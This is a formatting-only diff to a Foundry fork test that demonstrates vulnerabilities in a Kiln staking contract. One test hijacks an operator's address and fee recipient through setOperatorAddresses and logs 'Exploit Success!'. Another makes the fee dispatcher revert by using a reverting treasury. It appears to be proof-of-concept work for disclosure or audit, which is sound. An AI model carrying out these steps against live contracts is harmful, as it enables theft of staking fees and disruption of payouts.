@@ -25,7 +25,8 @@ contract KilnStakingForkTest is Test {
     address public feeRecipient = address(0x02);
     address public mockDepositContract = address(0x03);
 
-    bytes public mockPubKey = hex"00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";
+    bytes public mockPubKey =
+        hex"00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";
 
     function setUp() public {
         staking = StakingContract(payable(STAKING_CONTRACT));
@@ -57,9 +58,9 @@ contract KilnStakingForkTest is Test {
         // 2. Now prove Vulnerability 1 (setOperatorAddresses modifier issue) on the mainnet bytecode
         vm.prank(admin);
         uint256 opIndex = staking.addOperator(operator, feeRecipient);
-        
+
         // Verify initial addresses
-        (address opAddr, address feeRec, , , , , ) = staking.getOperator(opIndex);
+        (address opAddr, address feeRec,,,,,) = staking.getOperator(opIndex);
         assertEq(opAddr, operator);
         assertEq(feeRec, feeRecipient);
 
@@ -69,10 +70,10 @@ contract KilnStakingForkTest is Test {
         staking.setOperatorAddresses(opIndex, attacker, attacker);
 
         // Verify it was successfully changed (privilege escalated!)
-        (address newOpAddr, address newFeeRec, , , , , ) = staking.getOperator(opIndex);
+        (address newOpAddr, address newFeeRec,,,,,) = staking.getOperator(opIndex);
         assertEq(newOpAddr, attacker);
         assertEq(newFeeRec, attacker);
-        
+
         console.log("----------------------------------------------------------------");
         console.log("Exploit Success!");
         console.log("New Hijacked Operator Address     :", newOpAddr);
@@ -86,7 +87,7 @@ contract KilnStakingForkTest is Test {
     function test_mainnet_dispatcher_vulnerabilities() public {
         // Setup reverting treasury contract
         RevertingContract badTreasury = new RevertingContract();
-        
+
         // We initialize our local forked StakingContract pointing to this bad treasury
         StakingContract stakingWithBadTreasury = new StakingContract();
         vm.prank(admin);
@@ -109,20 +110,10 @@ contract KilnStakingForkTest is Test {
 
         // Set up mocks for the StakingContract functions called by the dispatcher
         bytes32 pubKeyRoot = sha256(abi.encodePacked(mockPubKey, bytes16(0)));
+        vm.mockCall(address(stakingWithBadTreasury), abi.encodeWithSignature("getGlobalFee()"), abi.encode(1000));
+        vm.mockCall(address(stakingWithBadTreasury), abi.encodeWithSignature("getOperatorFee()"), abi.encode(5000));
         vm.mockCall(
-            address(stakingWithBadTreasury),
-            abi.encodeWithSignature("getGlobalFee()"),
-            abi.encode(1000)
-        );
-        vm.mockCall(
-            address(stakingWithBadTreasury),
-            abi.encodeWithSignature("getOperatorFee()"),
-            abi.encode(5000)
-        );
-        vm.mockCall(
-            address(stakingWithBadTreasury),
-            abi.encodeWithSignature("getTreasury()"),
-            abi.encode(address(badTreasury))
+            address(stakingWithBadTreasury), abi.encodeWithSignature("getTreasury()"), abi.encode(address(badTreasury))
         );
         vm.mockCall(
             address(stakingWithBadTreasury),
@@ -155,8 +146,7 @@ contract KilnStakingForkTest is Test {
         // it reverts with FeeRecipientReceiveError!
         vm.expectRevert(
             abi.encodeWithSelector(
-                ExecutionLayerFeeDispatcher.FeeRecipientReceiveError.selector,
-                expectedInnerRevertData
+                ExecutionLayerFeeDispatcher.FeeRecipientReceiveError.selector, expectedInnerRevertData
             )
         );
         elDispatcher.dispatch(pubKeyRoot);
